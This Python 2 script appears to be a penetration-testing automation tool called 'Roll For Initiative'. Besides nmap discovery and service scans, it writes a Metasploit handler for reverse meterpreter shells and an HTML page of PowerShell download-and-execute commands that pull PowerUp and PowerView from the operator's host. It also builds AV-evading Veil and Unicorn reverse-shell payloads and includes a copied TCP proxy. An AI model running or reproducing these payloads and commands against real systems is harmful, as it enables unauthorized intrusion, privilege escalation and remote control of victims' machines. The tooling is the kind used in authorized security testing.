#!/usr/bin/python
# Andrew Luke @sw4mp_f0x
#ToDo: 
#	Standalone scan option for at least ping sweep.
#	Check for live-hosts before ping-sweep and ask if you still want to run. 
# 	Fix smtp relay file overwritten by user enum
#
#Todo:
#- Add ssh and telnet brute forcing
#- Add NFSulator
#- Implement new webinterface tool


import sys
import subprocess
import os
import logging
import shutil


def setup():

	#Check for client folder. Create if it does not exist
	clients_path="/root/Clients/"
	if not os.path.exists(clients_path):
		os.makedirs(clients_path)
	Client=raw_input("Client name: ")
	global client_folder
	client_folder = clients_path + Client + "/"
	if not os.path.exists(client_folder):
		os.makedirs(client_folder)


	#Check for required files
	while not os.path.exists(client_folder + "scope.txt"):
		create_scope=raw_input("A list of IP addresses or IP ranges needs to be definied within %s. Hit enter when completed..." %(client_folder + "scope.txt"))
	while not os.path.exists(client_folder + "excludes.txt"):
		create_scope=raw_input("A list of IP addresses or IP ranges needs to be definied within %s, even if it is empty. Hit enter when completed..." %(client_folder + "excludes.txt"))

	#log_file=filepath+Client+"/"+client+".log"
	log_file=raw_input("Define log file location:[%s] " %(client_folder + Client + ".log"))
	if not log_file:
		log_file=client_folder + Client + ".log"
	logging.basicConfig(filename=log_file, format='%(asctime)s %(message)s', level=logging.INFO, datefmt='%m/%d/%Y %I:%M:%S %p -')
	

def execute(selection):
	options={"1" : kickoff,
			 "2" : web_interfaces,
			 "3" : service_scan,
			 "4" : pentest_setup,
			 "5" : nfsulator
	}
	options[selection]()
	
def kickoff():
	#Ping-Sweep
	print "===================================="
	print "Beginning Kickoff Scan"
	print "===================================="
	logging.info("Beginning Ping Sweep")
	ping_sweep=subprocess.Popen(['nmap -sn -v10 -T4 --open -iL %sscope.txt --excludefile %sexcludes.txt -oG %sping-sweep --stats-every 1m' %(client_folder, client_folder, client_folder)], shell=True) 
	ping_sweep.wait()
	logging.info("Ping Sweep Complete")
	os.system("awk '/Up/{print $2}' %sping-sweep |sort -u > %slive-hosts.txt" %(client_folder, client_folder))
	livehosts=open("%slive-hosts.txt" %(client_folder), "r")
	for host in livehosts:
		global LiveHostCount
		LiveHostCount+=1
	livehosts.close()

	#Check for exclusions within live-hosts
	print "\n\nRFI found %s live hosts on the network." %(LiveHostCount)
	check=raw_input("Check that the exclusions were actually excluded and then press [Enter] to continue...")

	#Targetted Port Scans
	print "===================================="
	print "Beginning Targetted Service Scans"
	print "===================================="
	
	logging.info("Beginning Targeted Port Scan")
	ports=["22", "23", "53", "389", "686", "2049", "5800,5900-5920", "5985", "10000"]
	ports_NSE=["445", "21", "25", "1433", "3306", "80"]
	
	for port in ports:
		logging.info("Scanning port %s." %(port))
		targetted_ports=subprocess.Popen(['nmap -Pn -n -p%s -sV --open -oA %s%s -v10 --stats-every 1m -iL %slive-hosts.txt' %(port, client_folder, port, client_folder)], shell=True) 
		targetted_ports.wait()	

	for port in ports_NSE:
		logging.info("Scanning port %s." %(port))
		targetted_ports_with_NSE=subprocess.Popen(['nmap -Pn -n -p%s -sV -sC --open -oA %s%s -v10 --stats-every 1m -iL %slive-hosts.txt' %(port, client_folder, port, client_folder)], shell=True) 
		targetted_ports_with_NSE.wait()
	

	logging.info("Targeted Port Scan Complete")

	if not os.path.exists(client_folder + "Finals"):
		os.makedirs(client_folder + "Finals")
	os.system("awk '!/telnet\?/ && !/print/ && !/printer/ && !/JetDirect/ && !/#/ && !/tcpwrapped/ && !/Ricoh/ && !/Up/ && !/APC/ && !/Pocket/' %s23.gnmap | uniq > %s/Finals/TelnetList.txt" %(client_folder, client_folder))
	os.system("awk '!/#/{print $2}' %s445.gnmap | sort -u > %s445.txt" %(client_folder, client_folder))

	print "===================================="
	print "Beginning SMTP Open Relay"
	print "and Enumeration NSE scripts"
	print "===================================="
	os.system("awk '!/printer/ && !/JetDirect/ && !/#/ && !/tcpwrapped/ && !/Ricoh/ && !/Up/ && !/APC/ && !/Pocket/{print $2}' %s25.gnmap | uniq > %ssmtprelay.txt" %(client_folder, client_folder))
	logging.info("Checking for open relays")
	open_relay=subprocess.Popen(['nmap -Pn --script smtp-open-relay.nse -p 25,465,587 --open -iL %ssmtprelay.txt -oA %sFinals/SMTP_Relay' %(client_folder, client_folder)], shell=True) 
	open_relay.wait()
	logging.info("Open relay check complete")

	logging.info("Checking for SMTP enum")
	open_relay=subprocess.Popen(['nmap -Pn --script smtp-enum-users.nse -p 25,465,587 --open -iL %ssmtprelay.txt -oA %sFinals/SMTP_Relay' %(client_folder, client_folder)], shell=True) 
	open_relay.wait()
	logging.info("SMTP enum check complete")
	os.remove("%ssmtprelay.txt" %(client_folder))

	global message
	message="Kickoff scans complete"
    
def web_interfaces():
	print "===================================="
	print "Beginning Rawr Scan"
	print "===================================="
	logging.info("Starting Nmap web scan")
	web_scan=subprocess.Popen(['nmap -sV --open -T4 -v7 -p80,280,443,591,593,981,1311,2031,2480,3181,4444,4445,4567,4711,4712,5104,5280,7000,7001,7002,8000,8008,8011,8012,8013,8014,8042,8069,8080,8081,8243,8280,8281,8443,8531,8887,8888,9080,9443,11371,12443,16080,18091,18092 -iL %slive-hosts.txt -oA %sweb' %(client_folder, client_folder)], shell=True) 
	web_scan.wait()
	logging.info("Nmap web scan complete")

	logging.info("Starting Rawr")
	rawr_proc=subprocess.Popen(["python %s -f %sweb.xml -d %s" %(rawr_folder, client_folder, client_folder)], shell=True) 
	rawr_proc.wait()
	logging.info("Rawr complete")

	global message
	message="Rawr complete"

def service_scan():
	print "===================================="
	print "Beginning Service Scan"
	print "===================================="
	logging.info("Starting service scan")
	service_scan=subprocess.Popen(['nmap -sV --open -iL %slive-hosts.txt -v10 -T4 -oA %ssvc-scan' %(client_folder, client_folder)], shell=True)
	service_scan.wait()
	logging.info("Service scan complete")

	global message
	message="Service scan complete"

def pentest_setup():
	print "===================================="
	print "Setting up pentest files"
	print "===================================="
	ip=raw_input("Enter LHOST> ")
	bounce=open('/bounce', "w")
	bounce.write('''use exploit/multi/handler
					jobs -K
					set payload windows/meterpreter/reverse_tcp
					set exitonsession false
					set lport 53
					set enablestageencoding true
					set autorunscript migrate -f
					set LHOST %s
					exploit -j -z
					set payload windows/meterpreter/reverse_https
					set lport 443
					exploit -j -z''' %(ip))
	
	bool=False
	while not bool:
		kali2=raw_input("Are you using Kali 2? [y/n]: ")
		global cmd_path
		if kali2 is "n":
			cmd_path="/var/www/cmd.html"
			bool=True
		elif kali2 is "y":
			cmd_path="/var/www/html/cmd.html"
			bool=True
	
	cmd_html=('''<b>Invoke-AllChecks</b><p><p>
				powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/PowerUp.ps1'); Invoke-Allchecks"
				<p><p>
				<b>Write-UserAddServiceBinary</b><p><p>
				powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/PowerUp.ps1'); Write-UserAddServiceBinary -ServiceName SQLRODBC"
				<p><p>
				<b>Invoke-ServiceUserAdd</b><p><p>
				powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/PowerUp.ps1'); Invoke-ServiceUserAdd -ServiceName spooler"
				<p><p>
				<b>Invoke-FindLocalAdminAccess</b><p><p>
				powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/powerview.ps1'); Invoke-FindLocalAdminAccess"
				<p><p>
				<b>Invoke-userhunter</b><p><p>
				powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/powerview.ps1'); Invoke-userhunter"
				<p><p>
				<b>Invoke-ShareFinder</b><p><p>
				powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/powerview.ps1'); Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii found_shares.txt"''' %(ip, ip, ip, ip, ip, ip))
	
	cmd_file=open(cmd_path, "w")
	cmd_file.write(cmd_html)
	cmd_file.close()

	#Deleting old files
	if os.path.exists("/root/HTTPS_443.exe"):	
		os.remove("/root/HTTPS_443.exe")
	if os.path.exists("/root/TCP_53.exe"):
		os.remove("/root/TCP_53.exe")
	if os.path.exists("/root/power443.txt"):
		os.remove("/root/power443.txt")
	if os.path.exists("/root/power53.txt"):
		os.remove("/root/power53.txt")
	if os.path.exists("/var/www/html/HTTPS_443.exe"):
		os.remove("/var/www/html/HTTPS_443.exe")
	if os.path.exists("/var/www/html/TCP_53.exe"):
		os.remove("/var/www/html/TCP_53.exe")
	if os.path.exists("/var/www/html/power443.txt"):
		os.remove("/var/www/html/power443.txt")
	if os.path.exists("/var/www/html/power53.txt"):
		os.remove("/var/www/html/power53.txt")
	if os.path.exists("/usr/share/veil-output/compiled/HTTPS_443.exe"):
		os.remove("/usr/share/veil-output/compiled/HTTPS_443.exe")
	if os.path.exists("/usr/share/veil-output/handlers/HTTPS_443_handler.rc"):
		os.remove("/usr/share/veil-output/handlers/HTTPS_443_handler.rc")
	if os.path.exists("/usr/share/veil-output/source/HTTPS_443.rb"):
		os.remove("/usr/share/veil-output/source/HTTPS_443.rb")
	if os.path.exists("/usr/share/veil-output/compiled/TCP_53.exe"):
		os.remove("/usr/share/veil-output/compiled/TCP_53.exe")
	if os.path.exists("/usr/share/veil-output/handlers/TCP_53_handler.rc"):
		os.remove("/usr/share/veil-output/handlers/TCP_53_handler.rc")
	if os.path.exists("/usr/share/veil-output/source/TCP_53.rb"):
		os.remove("/usr/share/veil-output/source/TCP_53.rb")
	
	#Build Veil Ruby HTTPS payload
	https_payload=subprocess.Popen(['/root/tools/Veil-Evasion/Veil-Evasion.py -p ruby/meterpreter/rev_https -c LPORT=443 LHOST=%s -o HTTPS_443' %(ip)], shell=True)
	https_payload.wait()
	shutil.copyfile("/usr/share/veil-output/compiled/HTTPS_443.exe", "/root/HTTPS_443.exe")
	shutil.copyfile("/usr/share/veil-output/compiled/HTTPS_443.exe", "/var/www/html/HTTPS_443.exe")

	#Build Veil Ruby HTTPS payload
	tcp_payload=subprocess.Popen(['/root/tools/Veil-Evasion/Veil-Evasion.py -p ruby/meterpreter/rev_tcp -c LPORT=53 LHOST=%s -o TCP_53' %(ip)], shell=True)
	tcp_payload.wait()
	shutil.copyfile("/usr/share/veil-output/compiled/TCP_53.exe", "/root/TCP_53.exe")
	shutil.copyfile("/usr/share/veil-output/compiled/TCP_53.exe", "/var/www/html/TCP_53.exe")

	#Build Unicorn Powershell HTTPS payload
	unicorn_https=subprocess.Popen(['python /root/tools/unicorn/unicorn.py windows/meterpreter/reverse_https %s 443' %(ip)], shell=True)
	unicorn_https.wait()
	shutil.copyfile("./powershell_attack.txt", "/root/powerHTTPS.txt")
	shutil.copyfile("./powershell_attack.txt", "/var/www/html/powerHTTPS.txt")
	update_cmd=open(cmd_path, "a")
	open_payload=open("./powershell_attack.txt", "r")
	unicorn_https_payload=open_payload.readlines()
	update_cmd.write('''<p><p>
						<b>Powershell HTTPS Payload</b><p><p>
						%s''' %(unicorn_https_payload[0]))
	open_payload.close()

	#Build Unicorn Powershell HTTPS payload
	unicorn_tcp=subprocess.Popen(['python /root/tools/unicorn/unicorn.py windows/meterpreter/reverse_tcp %s 53' %(ip)], shell=True)
	unicorn_tcp.wait()
	shutil.copyfile("./powershell_attack.txt", "/root/powerTCP.txt")
	shutil.copyfile("./powershell_attack.txt", "/var/www/html/powerTCP.txt")
	open_payload=open("./powershell_attack.txt", "r")
	unicorn_tcp_payload=open_payload.readlines()
	update_cmd.write('''<p><p>
						<b>Powershell TCP Payload</b><p><p>
						%s''' %(unicorn_tcp_payload[0]))
	update_cmd.close()
	open_payload.close()
	os.remove("./powershell_attack.txt")
	os.remove("./unicorn.rc")

	global message
	message="Pentest setup complete"

def nfsulator():
	print "===================================="
	print "Starting NFSulator (by @MrMindscrew)"
	print "===================================="

	os.system("awk '!/#/{print $2}' %s2049.gnmap | sort -u > %snfs.txt" %(client_folder, client_folder))
	nfs_file=open("%snfs.txt" %(client_folder))
	nfs_hosts=nfs_file.readlines()
	if not os.path.exists("/tmp/nfs"):
		os.makedirs("/tmp/nfs")
	
	for ip in nfs_hosts:
		os.system('''showmount -e  %s | grep "/" | awk '{print "%s:"$1 }' ''' %(ip, ip))

	global message
	message="Kickoff Scan complete"

def tcp_server(bind_ip, bind_port=9999):
	import socket
	import threading
	
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	server.bind((bind_ip,bind_port))
	
	server.listen(5)
	
	print "[*] Listening on %s:%d" % (bind_ip,bind_port)
	
	# this is our client handling thread
	def handle_client(client_socket):
	
	    # just print out what the client sends
	    request = client_socket.recv(1024)
	    
	    print "[*] Received: %s" % request    
	
	    # send back a packet
	    client_socket.send("ACK!")
	    print client_socket.getpeername()
	    client_socket.close()


	while True:
	
	    client,addr = server.accept()
	    
	    print "[*] Accepted connection from: %s:%d" % (addr[0],addr[1])
	
	    # spin up our client thread to handle incoming data
	    client_handler = threading.Thread(target=handle_client,args=(client,))
	    client_handler.start()


#TCP Proxy code from Black Hat Python by Justin Seitz
def tcp_proxy():
	import sys
	import socket
	import threading
	
	
	
	# this is a pretty hex dumping function directly taken from
	# http://code.activestate.com/recipes/142812-hex-dumper/
	def hexdump(src, length=16):
	    result = []
	    digits = 4 if isinstance(src, unicode) else 2
	
	    for i in xrange(0, len(src), length):
	       s = src[i:i+length]
	       hexa = b' '.join(["%0*X" % (digits, ord(x))  for x in s])
	       text = b''.join([x if 0x20 <= ord(x) < 0x7F else b'.'  for x in s])
	       result.append( b"%04X   %-*s   %s" % (i, length*(digits + 1), hexa, text) )
	
	    print b'\n'.join(result)
	
	
	def receive_from(connection):
	        
	        buffer = ""
	
		# We set a 2 second time out depending on your 
		# target this may need to be adjusted
		connection.settimeout(2)
		
	        try:
	                # keep reading into the buffer until there's no more data
			# or we time out
	                while True:
	                        data = connection.recv(4096)
	                        
	                        if not data:
	                                break
	                        
	                        buffer += data
	                
	                
	        except:
			pass
	        
	        return buffer
	
	# modify any requests destined for the remote host
	def request_handler(buffer):
		# perform packet modifications
		return buffer
	
	# modify any responses destined for the local host
	def response_handler(buffer):
		# perform packet modifications
		return buffer
	
	
	def proxy_handler(client_socket, remote_host, remote_port, receive_first):
	        
	        # connect to the remote host
	        remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	        remote_socket.connect((remote_host,remote_port))
	
	        # receive data from the remote end if necessary
	        if receive_first:
	                
	                remote_buffer = receive_from(remote_socket)
	                hexdump(remote_buffer)
			
	                # send it to our response handler
			remote_buffer = response_handler(remote_buffer)
	                
	                # if we have data to send to our local client send it
	                if len(remote_buffer):
	                        print "[<==] Sending %d bytes to localhost." % len(remote_buffer)
	                        client_socket.send(remote_buffer)
	                        
		# now let's loop and reading from local, send to remote, send to local
		# rinse wash repeat
		while True:
			
			# read from local host
			local_buffer = receive_from(client_socket)
	
	
			if len(local_buffer):	
				
				print "[==>] Received %d bytes from localhost." % len(local_buffer)
				hexdump(local_buffer)
				
				# send it to our request handler
				local_buffer = request_handler(local_buffer)
				
				# send off the data to the remote host
				remote_socket.send(local_buffer)
				print "[==>] Sent to remote."
			
			
			# receive back the response
			remote_buffer = receive_from(remote_socket)
	
			if len(remote_buffer):
				
				print "[<==] Received %d bytes from remote." % len(remote_buffer)
				hexdump(remote_buffer)
				
				# send to our response handler
				remote_buffer = response_handler(remote_buffer)
			
				# send the response to the local socket
				client_socket.send(remote_buffer)
				
				print "[<==] Sent to localhost."
			
			# if no more data on either side close the connections
			if not len(local_buffer) or not len(remote_buffer):
				client_socket.close()
				remote_socket.close()
				print "[*] No more data. Closing connections."
			
				break
			
	def server_loop(local_host,local_port,remote_host,remote_port,receive_first):
	                
	        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	        try:
	                server.bind((local_host,local_port))
	        except:
	                print "[!!] Failed to listen on %s:%d" % (local_host,local_port)
	                print "[!!] Check for other listening sockets or correct permissions."
	                sys.exit(0)
	                
	        print "[*] Listening on %s:%d" % (local_host,local_port)
	        
	        
	        server.listen(5)        
	        
	        while True:
	                client_socket, addr = server.accept()
	               
	                # print out the local connection information
	                print "[==>] Received incoming connection from %s:%d" % (addr[0],addr[1])
	                
	                # start a thread to talk to the remote host
	                proxy_thread = threading.Thread(target=proxy_handler,args=(client_socket,remote_host,remote_port,receive_first))
	                proxy_thread.start()
	
	def main():
	        
	    # no fancy command line parsing here
	    if len(sys.argv[1:]) != 5:
	        print "Usage: ./proxy.py [localhost] [localport] [remotehost] [remoteport] [receive_first]"
	        print "Example: ./proxy.py 127.0.0.1 9000 10.12.132.1 9000 True"
	        sys.exit(0)
	    
	    # setup local listening parameters
	    local_host  = sys.argv[1]
	    local_port  = int(sys.argv[2])
	    
	    # setup remote target
	    remote_host = sys.argv[3]
	    remote_port = int(sys.argv[4])
	    
	    # this tells our proxy to connect and receive data
	    # before sending to the remote host
	    receive_first = sys.argv[5]
	    
	    if "True" in receive_first:
		    receive_first = True
	    else:
		    receive_first = False
		    
	    
	    # now spin up our listening socket
	    server_loop(local_host,local_port,remote_host,remote_port,receive_first)
	        
	main() 

def ssh_telnet_brute():

	logging.info("Scanning port %s." %(port))
	targetted_ports=subprocess.Popen(['nmap -Pn -n -p%s -sV --open -oA %s%s -v10 --stats-every 1m -iL %slive-hosts.txt' %(port, client_folder, port, client_folder)], shell=True) 
	targetted_ports.wait()


def main_menu(check=""):
	try:
		print("==========================================================")
		print("Roll For Initiative")
		print("By: @Sw4mp_f0x")
		print("==========================================================")
		print("")
		
		#Check for message, print message if present, clear out message
		if check:
			print(check)
			print("")
		global message
		message=""
		
		print("Roll For Initiative Options:")
		print("	[1] Kickoff Scans")
		print("	[2] Web Interface Scan + Rawr")
		print("	[3] Nmap Service Scan")
		print("	[4] Pentest Setup")
		print("	[5] NFSulator (by @MrMindscrew)")
		print("")
		selection=raw_input("Please select an option: ")
		if 1 <= int(selection) <= 5:
			execute(selection)
		else:
			raise ValueError('A very specific bad thing happened')
	except ValueError:
		unused_var=os.system("clear")
		main_menu("Invalid entry. Pick again.")

LiveHostCount=0
rawr_folder="/root/tools/rawr/rawr.py"
global cmd_path
cmd_path=""
global message
message=""
setup()

try:
	while True:
		main_menu(message)
		unused_var=os.system("clear")
except KeyboardInterrupt:
	print("Later!")	


